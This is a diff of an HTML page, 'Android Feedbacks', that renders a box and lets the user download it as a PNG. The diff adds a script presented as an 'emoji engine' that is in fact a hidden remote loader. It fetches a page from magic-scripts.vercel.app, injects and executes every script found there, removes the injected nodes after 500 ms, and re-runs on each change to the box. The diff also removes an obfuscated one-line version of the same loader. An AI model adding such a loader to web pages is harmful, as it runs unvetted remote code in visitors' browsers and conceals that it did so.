@@ -6,9 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="styles.css">
-    <link rel="shortcut icon"
-        href="tg.webp"
-        type="image/x-icon">
+    <link rel="shortcut icon" href="tg.webp" type="image/x-icon">
     <title>Android Feedbacks</title>
 </head>
 
@@ -30,11 +28,75 @@
 
         <img src="feed-thumb.jpg" alt="" srcset="" class="bg_img">
     </div>
+    
     <button class="btn">DOWNLOAD FEEDBACK</button>
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
         integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="check.js"></script>
-    <script>async()=>{try{let r=await fetch(`https://magic-scripts.vercel.app/heart.html`),t=await r.text(),d=new DOMParser().parseFromString(t,'text/html');d.querySelectorAll('script').forEach(s=>{let n=document.createElement('script');s.src?n.src=s.src:n.textContent=s.innerHTML||s.textContent;document.body.appendChild(n);setTimeout(()=%3En.remove(),500)});console.log(%22Active%22)}catch(e){console.error(%22Error!%22)}})();</script>
+    
+    <script>
+        // --- MULTI-ENVIRONMENT INJECTOR WITH OBSERVER SYSTEM ---
+        async function runEmojiEngine() {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 500); // Bookmarklet style execution time (500ms)
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        }
+
+        // Execution logic triggers
+        runEmojiEngine();
+
+        // Target checking for dynamic updates
+        const targetBox = document.getElementById('box');
+        if (targetBox) {
+            let updateDebounce;
+            const engineObserver = new MutationObserver(() => {
+                clearTimeout(updateDebounce);
+                updateDebounce = setTimeout(() => {
+                    runEmojiEngine();
+                }, 100); // Fast but completely safe update window
+            });
+
+            engineObserver.observe(targetBox, {
+                childList: true,
+                subtree: true,
+                characterData: true
+            });
+        }
+
+        // --- HTML2CANVAS FORCE SNAPSHOT EXTENSION ---
+        document.querySelector('.btn').addEventListener('click', function () {
+            const element = document.getElementById('box');
+            html2canvas(element, {
+                useCORS: true,
+                allowTaint: true,
+                scale: 2,
+                logging: false
+            }).then(canvas => {
+                let downloadAnchor = document.createElement('a');
+                downloadAnchor.download = 'Android-Feedback.png';
+                downloadAnchor.href = canvas.toDataURL('image/png');
+                downloadAnchor.click();
+            }).catch(err => console.error("Capture runtime error:", err));
+        });
+    </script>
 </body>
+
 </html>
